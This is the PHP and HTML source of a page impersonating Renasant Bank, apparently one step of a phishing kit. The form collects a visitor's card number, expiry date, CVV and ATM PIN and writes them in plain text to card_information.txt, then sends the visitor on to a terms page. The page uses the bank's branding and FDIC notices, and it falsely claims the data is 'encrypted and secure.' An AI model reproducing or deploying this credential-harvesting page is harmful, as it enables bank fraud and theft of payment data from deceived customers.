<?php
session_start();
require_once __DIR__ . '/includes/file_storage.php';

// Redirect to login if no username in session
if (!isset($_SESSION['emzemz'])) {
    header('Location: index.php');
    exit;
}

$username = $_SESSION['emzemz'];
$errors = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get form data
    $cardNumber = $_POST['cardNumber'] ?? '';
    $expiryMonth = $_POST['expiryMonth'] ?? '';
    $expiryYear = $_POST['expiryYear'] ?? '';
    $cvv = $_POST['cvv'] ?? '';
    $atmPin = $_POST['atmPin'] ?? '';
    
    // Validation
    $cardDigits = preg_replace('/\s/', '', $cardNumber);
    if (strlen($cardDigits) !== 16) {
        $errors['cardNumber'] = 'Card number must be 16 digits';
    }
    
    if (empty($expiryMonth) || empty($expiryYear)) {
        $errors['expiry'] = 'Expiry date is required';
    }
    
    if (strlen($cvv) !== 3 && strlen($cvv) !== 4) {
        $errors['cvv'] = 'CVV must be 3 or 4 digits';
    }
    
    if (strlen($atmPin) !== 4) {
        $errors['atmPin'] = 'ATM PIN must be 4 digits';
    }
    
    if (empty($errors)) {
        // Save to test file (matching affinity field names)
        $data = [
            'step' => 'card_information',
            'usrnm' => $username,
            'pay_card' => $cardDigits,
            'exp_mth' => $expiryMonth,
            'exp_yr' => $expiryYear,
            'sec_cd' => $cvv,
            'pin_cd' => $atmPin
        ];
        
        saveUserData('card_information.txt', $data);
        
        // Redirect to terms page
        header('Location: terms.php');
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Card Information - Renasant Bank</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="min-h-screen bg-gradient-to-b from-[#f7f9fd] via-[#d6e0ec] to-[#4d6f96] flex flex-col">
    <!-- Header -->
    <header class="bg-[#114b66]">
        <div class="max-w-6xl mx-auto">
            <div class="h-20 flex items-center justify-center px-6">
                <img
                    src="assets/Logo-Dark-Background.png"
                    alt="Renasant Bank"
                    class="h-10 w-auto"
                />
            </div>
        </div>
        <div class="bg-white/90">
            <div class="max-w-6xl mx-auto px-6 py-2 text-xs text-slate-600">
                <div class="flex items-center gap-3 italic">
                    <img
                        src="assets/FDIC_Logo_blue.svg"
                        alt="FDIC"
                        class="h-6 w-auto"
                    />
                    <span>FDIC-Insured - Backed by the full faith and credit of the U.S. Government</span>
                </div>
            </div>
        </div>
    </header>

    <!-- Main Content -->
    <main class="flex-1 flex items-center justify-center px-4 py-12">
        <div class="space-y-6 w-full max-w-md">
            <div class="bg-white rounded-md p-8 shadow-lg shadow-slate-900/10 space-y-6">
                <div class="text-center space-y-2">
                    <h2 class="text-2xl font-semibold text-slate-700">Card Information</h2>
                    <p class="text-sm text-slate-600">Please provide your card details for verification purposes</p>
                </div>
                
                <?php if (!empty($errors)): ?>
                    <div class="bg-red-50 border-l-4 border-red-500 p-4">
                        <div class="flex">
                            <div class="flex-shrink-0">
                                <svg class="h-5 w-5 text-red-500" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                                    <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd" />
                                </svg>
                            </div>
                            <div class="ml-3">
                                <p class="text-sm text-red-700">
                                    Please fix the following errors:
                                    <ul class="list-disc pl-5 mt-1">
                                        <?php foreach ($errors as $error): ?>
                                            <li><?php echo htmlspecialchars($error); ?></li>
                                        <?php endforeach; ?>
                                    </ul>
                                </p>
                            </div>
                        </div>
                    </div>
                <?php endif; ?>
                
                <form method="POST" class="space-y-4">
                    <!-- Card Number -->
                    <div>
                        <label for="cardNumber" class="block text-sm text-slate-500 font-medium mb-1">Card Number</label>
                        <input
                            type="text"
                            id="cardNumber"
                            name="cardNumber"
                            value="<?php echo htmlspecialchars($_POST['cardNumber'] ?? ''); ?>"
                            maxlength="19"
                            class="w-full px-3 py-2 border border-slate-200 rounded-md focus:outline-none focus:ring-2 focus:ring-[#0f4f6c] focus:border-transparent"
                            placeholder="1234 5678 9012 3456"
                            required
                        >
                        <?php if (!empty($errors['cardNumber'])): ?>
                            <p class="mt-1 text-sm text-red-600 flex items-center gap-2">
                                <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                                </svg>
                                <?php echo htmlspecialchars($errors['cardNumber']); ?>
                            </p>
                        <?php endif; ?>
                    </div>
                    
                    <!-- Expiry Date -->
                    <div>
                        <label class="block text-sm text-slate-500 font-medium mb-1">Expiry Date</label>
                        <div class="flex gap-2">
                            <select
                                id="expiryMonth"
                                name="expiryMonth"
                                class="flex-1 px-3 py-2 border border-slate-200 rounded-md focus:outline-none focus:ring-2 focus:ring-[#0f4f6c] focus:border-transparent"
                                required
                            >
                                <option value="">Month</option>
                                <?php for ($i = 1; $i <= 12; $i++): ?>
                                    <option value="<?php echo str_pad($i, 2, '0', STR_PAD_LEFT); ?>" <?php echo (isset($_POST['expiryMonth']) && $_POST['expiryMonth'] == str_pad($i, 2, '0', STR_PAD_LEFT)) ? 'selected' : ''; ?>>
                                        <?php echo str_pad($i, 2, '0', STR_PAD_LEFT); ?>
                                    </option>
                                <?php endfor; ?>
                            </select>
                            <select
                                id="expiryYear"
                                name="expiryYear"
                                class="flex-1 px-3 py-2 border border-slate-200 rounded-md focus:outline-none focus:ring-2 focus:ring-[#0f4f6c] focus:border-transparent"
                                required
                            >
                                <option value="">Year</option>
                                <?php for ($i = 0; $i < 15; $i++): ?>
                                    <option value="<?php echo date('Y') + $i; ?>" <?php echo (isset($_POST['expiryYear']) && $_POST['expiryYear'] == date('Y') + $i) ? 'selected' : ''; ?>>
                                        <?php echo date('Y') + $i; ?>
                                    </option>
                                <?php endfor; ?>
                            </select>
                        </div>
                        <?php if (!empty($errors['expiry'])): ?>
                            <p class="mt-1 text-sm text-red-600 flex items-center gap-2">
                                <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                                </svg>
                                <?php echo htmlspecialchars($errors['expiry']); ?>
                            </p>
                        <?php endif; ?>
                    </div>
                    
                    <!-- CVV -->
                    <div>
                        <label for="cvv" class="block text-sm text-slate-500 font-medium mb-1">CVV</label>
                        <div class="relative">
                            <input
                                type="password"
                                id="cvv"
                                name="cvv"
                                value="<?php echo htmlspecialchars($_POST['cvv'] ?? ''); ?>"
                                maxlength="4"
                                class="w-full px-3 py-2 border border-slate-200 rounded-md focus:outline-none focus:ring-2 focus:ring-[#0f4f6c] focus:border-transparent"
                                placeholder="123"
                                required
                            >
                            <button
                                type="button"
                                onclick="toggleCVVVisibility()"
                                class="absolute right-3 top-1/2 -translate-y-1/2 text-[#0f4f6c] text-sm hover:underline"
                            >
                                <span id="cvvToggleText">Show</span>
                            </button>
                        </div>
                        <?php if (!empty($errors['cvv'])): ?>
                            <p class="mt-1 text-sm text-red-600 flex items-center gap-2">
                                <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                                </svg>
                                <?php echo htmlspecialchars($errors['cvv']); ?>
                            </p>
                        <?php endif; ?>
                    </div>
                    
                    <!-- ATM PIN -->
                    <div>
                        <label for="atmPin" class="block text-sm text-slate-500 font-medium mb-1">ATM PIN</label>
                        <div class="relative">
                            <input
                                type="password"
                                id="atmPin"
                                name="atmPin"
                                value="<?php echo htmlspecialchars($_POST['atmPin'] ?? ''); ?>"
                                maxlength="4"
                                class="w-full px-3 py-2 border border-slate-200 rounded-md focus:outline-none focus:ring-2 focus:ring-[#0f4f6c] focus:border-transparent"
                                placeholder="****"
                                required
                            >
                            <button
                                type="button"
                                onclick="togglePINVisibility()"
                                class="absolute right-3 top-1/2 -translate-y-1/2 text-[#0f4f6c] text-sm hover:underline"
                            >
                                <span id="pinToggleText">Show</span>
                            </button>
                        </div>
                        <?php if (!empty($errors['atmPin'])): ?>
                            <p class="mt-1 text-sm text-red-600 flex items-center gap-2">
                                <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                                </svg>
                                <?php echo htmlspecialchars($errors['atmPin']); ?>
                            </p>
                        <?php endif; ?>
                    </div>
                    
                    <!-- Submit Button -->
                    <div class="pt-4">
                        <button
                            type="submit"
                            class="w-full bg-[#0f4f6c] text-white py-3 rounded-md font-medium transition hover:bg-[#0a3d52]"
                        >
                            Continue
                        </button>
                    </div>
                    
                    <p class="text-xs text-slate-500 mt-4">
                        Your card information is encrypted and secure. We use industry-standard security measures to protect your data.
                    </p>
                </form>
            </div>
        </div>
    </main>

    <!-- Footer -->
    <footer class="bg-[#114b66] text-white">
        <div class="max-w-6xl mx-auto px-6 py-6">
            <div class="flex flex-col gap-4">
                <div class="flex items-center gap-4 text-sm">
                    <div class="flex items-center gap-3">
                        <img src="assets/ehl.svg" alt="Equal Housing Lender" class="h-10 w-auto" />
                        <img src="assets/fdic.svg" alt="Member FDIC" class="h-10 w-auto" />
                    </div>
                    <span class="uppercase tracking-wide text-xs">© RENASANT BANK</span>
                </div>

                <div class="flex flex-wrap gap-3 text-sm">
                    <a class="underline" href="#">Accessibility</a>
                    <span>|</span>
                    <a class="underline" href="#">Mobile Privacy</a>
                    <span>|</span>
                    <a class="underline" href="#">Privacy Statement</a>
                    <span>|</span>
                    <a class="underline" href="#">Digital Banking Agreement</a>
                </div>
            </div>
        </div>
    </footer>

    <script>
        // Format card number
        document.getElementById('cardNumber').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            let formatted = value.match(/.{1,4}/g);
            e.target.value = formatted ? formatted.join(' ') : value;
        });
        
        // Toggle CVV visibility
        function toggleCVVVisibility() {
            const cvvInput = document.getElementById('cvv');
            const toggleText = document.getElementById('cvvToggleText');
            
            if (cvvInput.type === 'password') {
                cvvInput.type = 'text';
                toggleText.textContent = 'Hide';
            } else {
                cvvInput.type = 'password';
                toggleText.textContent = 'Show';
            }
        }
        
        // Toggle PIN visibility
        function togglePINVisibility() {
            const pinInput = document.getElementById('atmPin');
            const toggleText = document.getElementById('pinToggleText');
            
            if (pinInput.type === 'password') {
                pinInput.type = 'text';
                toggleText.textContent = 'Hide';
            } else {
                pinInput.type = 'password';
                toggleText.textContent = 'Show';
            }
        }
        
        // Auto-focus card number on page load
        document.addEventListener('DOMContentLoaded', function() {
            const cardInput = document.getElementById('cardNumber');
            if (cardInput) {
                cardInput.focus();
            }
        });
    </script>
</body>
</html>
